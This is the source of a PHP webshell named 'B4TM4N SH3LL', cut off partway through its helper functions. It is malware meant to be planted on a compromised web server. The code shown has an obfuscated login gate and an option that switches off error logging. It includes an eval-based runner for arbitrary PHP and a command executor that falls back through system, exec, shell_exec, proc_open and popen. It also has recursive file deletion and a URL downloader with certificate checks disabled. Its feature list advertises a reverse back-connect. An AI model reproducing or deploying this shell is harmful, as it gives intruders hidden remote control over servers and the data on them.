<?php
/* 
 * B4TM4N SH3LL is PHP WEBSHELL
 *
 * Features:
 *		[0] File Manager
 *		[1] Sec. Info
 *		[2] Simply Database
 *		[3] Interactive terminal
 *		[4] PHP Reverse Back Connect
 *		[5] Run PHP Code
 *		[6] Custom Toolz
 *
*/

$config=[
	"user"    => "zaIgxSRawZ==",                             // B64E('user')
	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
	"title"   => "B4TM4N SH3LL",                             // Title
	"version" => "2.1",                                      // Version
	"debug"   => true                                        // Debug Mode
];

session_start(); // Session Start

function any($x,$y)
{
	return array_key_exists($x,$y);
}

function urle($x)
{
	return B64E(urlencode($x));
}

function urld($x)
{
	return urldecode(B64D(urldecode($x)));
}

define('_',DIRECTORY_SEPARATOR);

foreach($_SERVER as $k => $v)
{
	define(strtolower($k),$_SERVER[$k]);
}

function B64E($x)
{
	$d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	$c="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
	return strtr(base64_encode($x),$d,$c);
}

function B64D($x)
{
	$d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	$c="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
	return base64_decode(strtr($x,$d,$c));
}

// Login Request
if(request_method=="POST")
{
	if(any("username",$_REQUEST)&&any("password",$_REQUEST)&&any("signin",$_REQUEST))
	{
		if((B64E($_REQUEST['username'])==$config["user"])&&(sha1(md5($_REQUEST['password']))==$config["pass"]))
		{
			session_regenerate_id();
			$_SESSION['action']=[
				"username" => B64E($_REQUEST['username']),
				"password" => sha1(md5($_REQUEST['password']))
			];
		}
	}
}

if(!any("action",$_SESSION))
{
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex"/>
<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
<title>Signin</title>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<style type='text/css'>
	html,body{
	height:100%;
	}
	body{
	display:-ms-flexbox;
	display:-webkit-box;
	display:flex;
	-ms-flex-align:center;
	-ms-flex-pack:center;
	-webkit-box-align:center;
	align-items:center;
	-webkit-box-pack:center;
	justify-content:center;
	padding-top:40px;
	padding-bottom:40px;
	background-color:#f5f5f5;
	}
	.form-signin{
	width:100%;
	max-width:330px;
	padding:15px;
	margin:0 auto;
	}
	.form-signin.checkbox{
	font-weight:400;
	}
	.form-signin.form-control{
	position:relative;
	box-sizing:border-box;
	height:auto;
	padding:10px;
	font-size:16px;
	}
	.form-signin.form-control:focus{
	z-index:2;
	}
	.form-signin input[type="email"]{
	margin-bottom:-1px;
	border-bottom-right-radius:0;
	border-bottom-left-radius:0;
	}
	.form-signin input[type="password"]{
	margin-bottom:10px;
	border-top-left-radius:0;
	border-top-right-radius:0;
	}
</style>
</head>
<body class="text-center">
	<form class="form-signin" method='post'>
		<h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
		<label for="username" class="sr-only">Email address</label>
		<input type="text" name="username" id="username" class="form-control" placeholder="Username" autocomplete="off" required autofocus>
		<label for="password" class="sr-only">Password</label>
		<input type="password" name="password" id="password" class="form-control" placeholder="Password" autocomplete="off" required>
		<button class="btn btn-lg btn-primary btn-block" type="submit" name="signin" value="signin">Sign In</button>
		<p class="mt-5 mb-3 text-muted">&copy;<?=date('Y')?></p>
	</form>
</body>
</html><?php
}
else
{
ob_start(); // Prevent Double Html $_REQUEST

if(!strpos(strval(ini_get('disable_functions')),'set_time_limit'))
{
	set_time_limit(0);
}

// Debug Settings
if($config['debug']==true) 
{
	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
}
else
{
	error_reporting(0);
	ini_set('error_log',null);
	ini_set('html_errors',0);
	ini_set('log_errors',0);
	ini_set('log_errors_max_len',0);
	ini_set('display_errors',0);
	ini_set('display_startup_errors',0);
}

ini_set('max_execution_time','60');
ini_set('memory_limit','256M');

$userAgent=B64D("FT06ACQoAXYrvHYXMUIMMV5e").$config["version"]; // Powered by B4TM4N/2.0
$start=microtime(true); // Time Pageload

?><!DOCTYPE html>
<html>
<head>
<title>
<?=sprintf('%s - %s',$config['title'],$config['version'])?>
</title>
<meta name='author' content='k4mpr3t'/>
<link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
<style type="text/css">

	*,html{margin:0;padding:0;line-height:1rem} 
	body{background:black;color:lime;font-family:monospace;font-size:13px} 
	a{color:lime;text-decoration:none} 
	a:hover{color:white} 
	hr{border:1px solid #111;margin:3px 0px 0px} 
	img{vertical-align:bottom} 
	::-moz-selection{background:red;color:white} 
	::selection{background:red;color:white} 

	#wrapper{width:93%;margin:37px auto 40px}
	#info{margin:0 0 23px 0;padding:0 13px 0 0}
	#logo{margin:0 0 23px 0;padding:23px 0 23px 0;border-top:1px solid #111;border-bottom:1px solid #111}

	#header{display:inline-block;width:100%}
	.header-left{float:left;width:66%}
	.header-right{float:right;width:34%}

	#connect{display:inline-block;width:100%}
	.connect-left{float:left;width:49%}
	.connect-right{float:right;width:49%}

	#database-session{display:inline-block;width:100%}
	.database-query{float:left;width:49%}
	.database-process{float:right;width:49%}

	#php{display:inline-block}
	.php-left{float:left;width:49%}
	.php-right{float:right;width:49%}

	.content{border:1px solid #111;padding:15px;overflow:auto;overflow-y:hidden}

	.divide{width:100%;display:inline-block}
	.divide-left{float:left;width:50%}
	.divide-right{float:right;width:50%}

	#php-configuration{text-align:center}

	#update{text-align:center}
	#process-list{padding:25px;margin:auto;width: 50%}
	
	.tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid #111}

	.menu{overflow:hidden;border-top:1px solid #111;border-bottom:1px solid #111;margin:10px 0}
	.menu > ul{list-style:none;margin:0;padding:0}
	.menu > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
	.menu > ul > li:hover{cursor:pointer}

	.menu-tools{overflow:hidden;border-top:1px solid #111;border-bottom:1px solid #111;margin:10px 0}
	.menu-tools > ul{list-style:none;margin:0;padding:0}
	.menu-tools > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
	.menu-tools > ul > li:hover{cursor:pointer}

	.menu-directory{;margin-bottom:10px}

	a.active{color:white}
	a.action{font-size:12px;padding:5px;margin:0px;background:#111;color:#fff;border:1px solid #222;cursor:pointer;outline:none;display:inline-block}
	a.action:hover{background:#222;border:1px solid #666}

	.new{margin-right:15px;}

	.hash label{width:100px;display:inline-block}
	.hash-capture label{margin:10px 0;display:inline-block}
	.hash input[type=radio]{margin-right:10px;display:inline-block;vertical-align:middle}

	label{display:inline-block;min-width:100px;}
	iframe{background:#fff}

	fieldset {border:1px solid #111;background:#000;color:lime;width:100%;padding:15px;box-sizing:border-box;min-height:154px}
	textarea {border:1px solid #111;background:#000;color:lime;width:100%;padding:15px;min-height:300px;outline:none;box-sizing:border-box;resize:none}
	input[type=submit]       {background:#111;border:1px solid #222;color:#fff;line-height:25px;padding:0 10px;cursor:pointer;outline:none}
	input[type=submit]:hover {background:#222;border:1px solid #666}
	input[type=text] {background:#000;color:lime;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
	input[type=file] {background:#000;color:lime;border:1px solid #111;width:200px;padding:2px;outline:none;box-sizing:border-box}
	select           {background:#000;color:lime;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}

	#title{text-align:center;font-size:44px;margin:0;color:#fff}
	#tools{min-height:125px;padding:10px;border-radius:5px}
	#account{min-height:100px;padding:10px;border-radius:5px}
	#thanks{text-align:center;font-size:16px;font-family:courier;padding:5% 0}
	#footer{margin:25px auto}
	#copyrights{text-align:center}
	#pageload{text-align:center}
	#query{margin-top:10px}
	#database-query{overflow:auto;margin:10px 0}
	#hexdump{height:300px;overflow:auto;overflow-x:hidden}
	#terminal{min-height:100px;padding:10px;border-radius:5px}
	#terminal-input{border:none}
	#curdir-terminal{min-width:10px}
	#database{min-height:100px;padding:10px;border-radius:5px}
	#database label{width:100px;padding:5px;margin-right:10px;display:inline-block}
	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
	#phpinfo table{margin:25px 0}
	#phpinfo tr:nth-child(odd){background-color:black}
	#phpinfo tr:nth-child(even){background-color:#111}
	#phpinfo td,th{padding:5px;border:1px solid #111}
	#phpinfo h1{margin:10px 0}
	#phpinfo h2{margin:10px 0}
	#phpinfo.e{width:200px}
	#phpinfo.v{word-break:break-word}
	#phpinfo img{display:none}
	#phpinfo hr{border:none}

	.line h2{position:relative;top:12px;width:100px;display:inline;background:black;padding:0 10px;color:#fff}
	.line{border-bottom:2px solid lime;text-align:center;width:287px;margin:auto}

	.table {width:100%;margin:10px 0}
	.table td,th{padding:5px;border:1px solid #111;word-break:break-all;max-width:250px;min-width:25px}
	.table td.kanan{word-break:break-word}
	.table td.kiri{width:30%}
	.table tr:nth-child(odd){background:black}
	.table tr:nth-child(even){background:#111}
	.table tr:hover td{background:#333}
	
	.table tfoot td{padding:10px;text-align:center}
	.map-switch{display:inline-block}
	
	.form-fix{margin:-15px 0}
	.frmsource{margin-top:10px}
	
	.hexdump{width:100%;padding:5px;margin-bottom:5px}
	.hexdump td{text-align:left}
	
	.highlight{background:#fff;word-break:break-word;padding:15px;margin-bottom:5px;height:300px;overflow:auto}
	
	.hash-capture{display:inline-block;width:100%}
	.hash-capture-left{float:left;width:49%}
	.hash-capture-right{float:right;width:49%}
	
	.clr{clear:both}
	.on{color:white}
	.off{color:red}
	.result{padding:10px}
	.sortable thead{cursor:pointer}
	.disablefunc{overflow-wrap:break-word}
	.loading{vertical-align:middle;width:16px;height:16px;display:inline-block;background:url('data:image/gif;base64,R0lGODlhEAAQAPIAAAAAAP///zw8PLy8vP///5ycnHx8fGxsbCH+GkNyZWF0ZWQgd2l0aCBhamF4bG9hZC5pbmZvACH5BAAKAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQACgABACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkEAAoAAgAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkEAAoAAwAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkEAAoABAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQACgAFACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQACgAGACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAAKAAcALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA==')}
</style>
<script type="text/javascript">
function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);else{r.$$guid||(r.$$guid=dean_addEvent.guid++),t.events||(t.events={});var o=t.events[e];o||(o=t.events[e]={},t["on"+e]&&(o[0]=t["on"+e])),o[r.$$guid]=r,t["on"+e]=handleEvent}}function removeEvent(t,e,r){t.removeEventListener?t.removeEventListener(e,r,!1):t.events&&t.events[e]&&delete t.events[e][r.$$guid]}function handleEvent(t){var e=!0;t=t||fixEvent(((this.ownerDocument||this.document||this).parentWindow||window).event);var r=this.events[t.type];for(var o in r)this.$$handleEvent=r[o],!1===this.$$handleEvent(t)&&(e=!1);return e}function fixEvent(t){return t.preventDefault=fixEvent.preventDefault,t.stopPropagation=fixEvent.stopPropagation,t}var stIsIE=!1;if(sorttable={init:function(){arguments.callee.done||(arguments.callee.done=!0,_timer&&clearInterval(_timer),document.createElement&&document.getElementsByTagName&&(sorttable.DATE_RE=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,forEach(document.getElementsByTagName("table"),function(t){-1!=t.className.search(/\bsortable\b/)&&sorttable.makeSortable(t)})))},makeSortable:function(t){if(0==t.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(t.rows[0]),t.insertBefore(the,t.firstChild)),null==t.tHead&&(t.tHead=t.getElementsByTagName("thead")[0]),1==t.tHead.rows.length){sortbottomrows=[];for(e=0;e<t.rows.length;e++)-1!=t.rows[e].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=t.rows[e]);if(sortbottomrows){null==t.tFoot&&(tfo=document.createElement("tfoot"),t.appendChild(tfo));for(e=0;e<sortbottomrows.length;e++)tfo.appendChild(sortbottomrows[e]);delete sortbottomrows}headrow=t.tHead.rows[0].cells;for(var e=0;e<headrow.length;e++)headrow[e].className.match(/\bsorttable_nosort\b/)||(mtch=headrow[e].className.match(/\bsorttable_([a-z0-9]+)\b/),mtch&&(override=mtch[1]),mtch&&"function"==typeof sorttable["sort_"+override]?headrow[e].sorttable_sortfunction=sorttable["sort_"+override]:headrow[e].sorttable_sortfunction=sorttable.guessType(t,e),headrow[e].sorttable_columnindex=e,headrow[e].sorttable_tbody=t.tBodies[0],dean_addEvent(headrow[e],"click",sorttable.innerSortFunction=function(t){if(-1!=this.className.search(/\bsorttable_sorted\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML=stIsIE?'&nbsp<font face="webdings">5</font>':"&nbsp;&#x25B4;",void this.appendChild(sortrevind);if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",void this.appendChild(sortfwdind);theadrow=this.parentNode,forEach(theadrow.childNodes,function(t){1==t.nodeType&&(t.className=t.className.replace("sorttable_sorted_reverse",""),t.className=t.className.replace("sorttable_sorted",""))}),sortfwdind=document.getElementById("sorttable_sortfwdind"),sortfwdind&&sortfwdind.parentNode.removeChild(sortfwdind),sortrevind=document.getElementById("sorttable_sortrevind"),sortrevind&&sortrevind.parentNode.removeChild(sortrevind),this.className+=" sorttable_sorted",sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",this.appendChild(sortfwdind),row_array=[],col=this.sorttable_columnindex,rows=this.sorttable_tbody.rows;for(e=0;e<rows.length;e++)row_array[row_array.length]=[sorttable.getInnerText(rows[e].cells[col]),rows[e]];row_array.sort(this.sorttable_sortfunction),tb=this.sorttable_tbody;for(var e=0;e<row_array.length;e++)tb.appendChild(row_array[e][1]);delete row_array}))}},guessType:function(t,e){sortfn=sorttable.sort_alpha;for(var r=0;r<t.tBodies[0].rows.length;r++)if(text=sorttable.getInnerText(t.tBodies[0].rows[r].cells[e]),""!=text){if(text.match(/^-?[£$¤]?[\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1]),second=parseInt(possdate[2]),first>12)return sorttable.sort_ddmm;if(second>12)return sorttable.sort_mmdd;sortfn=sorttable.sort_ddmm}}return sortfn},getInnerText:function(t){if(!t)return"";if(hasInputs="function"==typeof t.getElementsByTagName&&t.getElementsByTagName("input").length,null!=t.getAttribute("sorttable_customkey"))return t.getAttribute("sorttable_customkey");if(void 0!==t.textContent&&!hasInputs)return t.textContent.replace(/^\s+|\s+$/g,"");if(void 0!==t.innerText&&!hasInputs)return t.innerText.replace(/^\s+|\s+$/g,"");if(void 0!==t.text&&!hasInputs)return t.text.replace(/^\s+|\s+$/g,"");switch(t.nodeType){case 3:if("input"==t.nodeName.toLowerCase())return t.value.replace(/^\s+|\s+$/g,"");case 4:return t.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var e="",r=0;r<t.childNodes.length;r++)e+=sorttable.getInnerText(t.childNodes[r]);return e.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(t){newrows=[];for(e=0;e<t.rows.length;e++)newrows[newrows.length]=t.rows[e];for(var e=newrows.length-1;e>=0;e--)t.appendChild(newrows[e]);delete newrows},sort_numeric:function(t,e){return aa=parseFloat(t[0].replace(/[^0-9.-]/g,"")),isNaN(aa)&&(aa=0),bb=parseFloat(e[0].replace(/[^0-9.-]/g,"")),isNaN(bb)&&(bb=0),aa-bb},sort_alpha:function(t,e){return t[0]==e[0]?0:t[0]<e[0]?-1:1},sort_ddmm:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},sort_mmdd:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},shaker_sort:function(t,e){for(var r=0,o=t.length-1,n=!0;n;){n=!1;for(s=r;s<o;++s)if(e(t[s],t[s+1])>0){a=t[s];t[s]=t[s+1],t[s+1]=a,n=!0}if(o--,!n)break;for(var s=o;s>r;--s)if(e(t[s],t[s-1])<0){var a=t[s];t[s]=t[s-1],t[s-1]=a,n=!0}r++}}},document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.init,!1),/WebKit/i.test(navigator.userAgent))var _timer=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.init()},10);window.onload=sorttable.init,dean_addEvent.guid=1,fixEvent.preventDefault=function(){this.returnValue=!1},fixEvent.stopPropagation=function(){this.cancelBubble=!0},Array.forEach||(Array.forEach=function(t,e,r){for(var o=0;o<t.length;o++)e.call(r,t[o],o,t)}),Function.prototype.forEach=function(t,e,r){for(var o in t)void 0===this.prototype[o]&&e.call(r,t[o],o,t)},String.forEach=function(t,e,r){Array.forEach(t.split(""),function(o,n){e.call(r,o,n,t)})};var forEach=function(t,e,r){if(t){var o=Object;if(t instanceof Function)o=Function;else{if(t.forEach instanceof Function)return void t.forEach(e,r);"string"==typeof t?o=String:"number"==typeof t.length&&(o=Array)}o.forEach(t,e,r)}};
</script>
<script type="text/javascript">
	var xhr;
	window.onload=function(){
		/* Cursor Focus */
		if(document.getElementById("terminal-input")!==null) document.getElementById("terminal-input").focus();
		if(document.getElementById("sourcefocus")!==null) document.getElementById("sourcefocus").focus();
		if(document.getElementById("php-code")!==null) document.getElementById("php-code").focus();
	};
	function getAjax(txt,id,method,url){
		var xmlhttp;
		if(txt){document.getElementById(id).innerHTML="Please Wait... <div class='loading'></div>";
		}else{document.getElementById(id).value="Please Wait...";}
		if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();
		}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
		xhr=xmlhttp;
		xmlhttp.onreadystatechange=function(){
			if(xmlhttp.readyState==4&&xmlhttp.status==200){
				if(txt){document.getElementById(id).innerHTML=xmlhttp.responseText;
				}else{document.getElementById(id).value=xmlhttp.responseText;}
			}else if(xmlhttp.readyState==4&&xmlhttp.status!=200){
				if(txt){document.getElementById(id).innerHTML="Error";
				}else{document.getElementById(id).value="Error";}
			}
		};
		xmlhttp.open(method,url,true);
		xmlhttp.send();
	}
	function ajaxAbort(txt,id){
		if(txt){document.getElementById(id).innerHTML="Canceled";
		}else{document.getElementById(id).value="Canceled";}
		xhr.abort();
	}
	function checkAll(){
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
			document.getElementsByName('chk[]')[i].checked=document.getElementsByName('check-all')[0].checked;	
		}
	}
	function checkCount(id){
		count=1;
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
			if(document.getElementsByName('chk[]')[i].checked){
				document.getElementById(id).innerHTML=count++;
			}else{
				document.getElementById(id).innerHTML=count-1;
			}
		}
	}
	function mapSwitch(id,id2){
		var a=document.getElementById(id);
		var b=document.getElementById(id2);
		if(a.style.display=='inline-block'){
			a.style.display='none';
			b.style.display='inline-block';
		}else{
			a.style.display='inline-block';
			b.style.display='none';
		}
	}
	function getParameter(paramName) {
		var searchString=window.location.search.substring(1),
		i,val,params=searchString.split("&");
		for (i=0;i<params.length;i++) {
			val=params[i].split("=");
			if (val[0]==paramName) {
				return val[1];
			}
		}
		return null;
	}
</script>
</head>
<body>
<div id="wrapper"><?php

$dir=any("d",$_REQUEST)?urld($_REQUEST['d']):getcwd();
$mapdir=any("r",$_REQUEST)?dirname(urld($_REQUEST['r'])):$dir;

function Unix() 
{
	return(strtolower(substr(PHP_OS,0,3))!="win");
}

function Evil($x)
{
	$response=@eval($x);
	if(error_get_last())
	{
	    return print_r(error_get_last());
	}
	return $response;
}

function Execute($x)
{
	$x=$x.' 2>&1';
	if(!is_null($backtic=`$x`))
	{
		return $backtic;
	}
	elseif(function_exists('system'))
	{
		ob_start();		
		$system=system($x);		
		$buff=ob_get_contents();		
		ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec'))
	{
		$buff="";
		exec($x,$results);		
		foreach($results as $result){$buff.=$result;}
		return $buff;
	}
	elseif(function_exists('shell_exec'))
	{
		$buff=shell_exec($x);	
		return $buff;
	}
	elseif(function_exists('pcntl_exec'))
	{
		$buff=pcntl_exec($x);	
		return $buff;
	}
	elseif(function_exists('passthru'))
	{
		ob_start();		
		$passthru=passthru($x);
		$buff=ob_get_contents();		
		ob_end_clean();		
		return $buff;
	}
	elseif(function_exists('proc_open'))
	{
		$proc=proc_open($x,[
			["pipe","r"],
			["pipe","w"],
			["pipe","w"]
		],$pipes);
		$buff=stream_get_contents($pipes[1]);
		return $buff;
	}
	elseif(function_exists('popen'))
	{
		$buff="";
		$pop=popen($x,"r");
		while(!feof($pop)){$buff.=fread($pop,1024);}
		pclose($pop);
		return $buff;
	}
	return "R.I.P Command";
}

function Remove($x)
{
	if(is_dir($x))
	{
		if($h=@opendir($x))
		{
			while(false!==($f=readdir($h)))
			{
				if($f!="."&&$f!="..")
				{
					Remove($x._.$f);
				}
			}
			closedir($h);
		}
		return rmdir($x);
	}
	elseif(is_file($x))
	{
		return unlink($x);
	}
	return false;
}

function CopyRecursive($x,$y)
{
	if(is_dir($x))
	{
		@mkdir($y);
		if($h=@opendir($x))
		{
			while(false!==($f=readdir($h)))
			{
				if($f!="."&&$f!="..")
				{
					CopyRecursive($x._.$f,$y._.$f);
				}
			}
			closedir($h);
		}
		return true;
	}
	elseif(is_file($x))
	{
		return copy($x,$y);
	}
	return false;
}

function MoveRecursive($x,$y)
{
	if(is_dir($x))
	{
		@mkdir($y);
		if($h=@opendir($x))
		{
			while(false!==($f=readdir($h)))
			{
				if($f!="."&&$f!="..")
				{
					MoveRecursive($x._.$f,$y._.$f);
				}
			}
			closedir($h);
		}
		return Remove($x);
	}
	elseif(is_file($x))
	{
		if(copy($x,$y))
		{
			return unlink($x);
		}
	}
	return false;
}

function GetDownloadUrl($x,$y)
{
	global $userAgent;
	$fl=fopen($y,"w");
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($ch,CURLOPT_URL,$x);
	curl_setopt($ch,CURLOPT_FILE,$fl);
	curl_setopt($ch,CURLOPT_HEADER,0);
	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
	$rs=curl_exec($ch);
	curl_close($ch);
	fclose($fl);
	return true;
}

function GetUrlExists($x)
{
	global $userAgent;
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
	curl_setopt($ch,CURLOPT_URL,$x);
	curl_setopt($ch,CURLOPT_TIMEOUT,5);
	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	$rs=curl_exec($ch);
	$http=curl_getinfo($ch,CURLINFO_HTTP_CODE);
	curl_close($ch);
	return ($http>=200 && $http<300);
}

function GetUrlContent($x)
{
	global $userAgent;
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_URL,$x);
	$rs=curl_exec($ch);
	curl_close($ch);
	return $rs;
	//$rs=file_get_contents($url);
}

function GetUrlFromPath($x)
{
	$fix_path=str_replace(_,'/',$x);
	$protocol=empty($_SERVER['HTTPS'])||$_SERVER['HTTPS']==='off'?'http://':'https://';
	$path=str_replace(document_root,'',$fix_path);
	return $protocol.server_name.$path;
}

function GetFileType($x) 
{
	if(is_file($x)) 
	{ 
		if (strpos($x,'.'))
		{
			return end(explode(".",$x));
		}
		else
		{
			return end(explode(_,$x));
		}
	}
	elseif(is_dir($x)) 
	{ 
		return "dir";
	}
	elseif(is_link($x)) 
	{ 
		return "link";
	}
	else
	{
		return "-";
	}
}

function GetFileTime($x,$y) 
{
	switch($y) 
	{
		case "create":return date("Y-m-d H:i:s",@filectime($x));break;
		case "modify":return date("Y-m-d H:i:s",@filemtime($x));break;
		case "access":return date("Y-m-d H:i:s",@fileatime($x));break;
	}
}

function GetFilePerm($x) 
{
	$perms=@fileperms($x);
	switch ($perms & 0xF000) 
	{
	    case 0xC000:$info='s';break;case 0xA000:$info='l';break;
	    case 0x8000:$info='r';break;case 0x6000:$info='b';break;
	    case 0x4000:$info='d';break;case 0x2000:$info='c';break;
	    case 0x1000:$info='p';break;default:$info='u';
	}
	$info .=(($perms & 0x0100)?'r':'-');
	$info .=(($perms & 0x0080)?'w':'-');
	$info .=(($perms & 0x0040)?(($perms & 0x0800)?'s':'x' ):(($perms & 0x0800)?'S':'-'));
	$info .=(($perms & 0x0020)?'r':'-');
	$info .=(($perms & 0x0010)?'w':'-');
	$info .=(($perms & 0x0008)?(($perms & 0x0400)?'s':'x' ):(($perms & 0x0400)?'S':'-'));
	$info .=(($perms & 0x0004)?'r':'-');
	$info .=(($perms & 0x0002)?'w':'-');
	$info .=(($perms & 0x0001)?(($perms & 0x0200)?'t':'x' ):(($perms & 0x0200)?'T':'-'));
	return sprintf('%s [%s]',$info,substr(decoct($perms),2));
}

function GetFileSize($x) 
{
	$x=abs($x);
	$size=['B','KB','MB','GB','TB','PB','EB','ZB','YB'];
	$exp=$x?floor(log($x)/log(1024)):0;
	return sprintf('%.2f '.$size[$exp],($x/pow(1024,floor($exp))));
}

function GetUser($x) 
{	
	if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
	{
		$uid=posix_getpwuid(posix_getuid());
		$gid=posix_getgrgid(posix_getgid());
		
		switch($x) 
		{	
			case 'usr':return $uid['name'];break;
			case 'uid':return $uid['uid'];break;
			case 'grp':return $gid['name'];break;
			case 'gid':return $gid['gid'];break;
		}
	}
	else
	{
		switch($x)
		{
			case 'usr':return get_current_user();break;
			case 'uid':return getmyuid();break;
			case 'grp':return "?";break;
			case 'gid':return getmygid();break;
		}
	}	
}

function GetOwnerGroup($x) 
{
	if(Unix())
	{
		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
		{
			$user=posix_getpwuid(fileowner($x));
			$group=posix_getgrgid(filegroup($x));
			return sprintf('%s:%s',$user['name'],$group['name']);
		}
	}
	return "?:?";
}

function GetFileOwnerGroup($x) 
{
	if(Unix())
	{
		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
		{
			$user=posix_getpwuid(fileowner($x));
			$group=posix_getgrgid(filegroup($x));
			return sprintf('%s(%s)/%s(%s)',$user['name'], $user['uid'],$group['name'],$group['gid']);
		}
	}
	return "?(?)/?(?)";
}

function MapDirectory($x) 
{
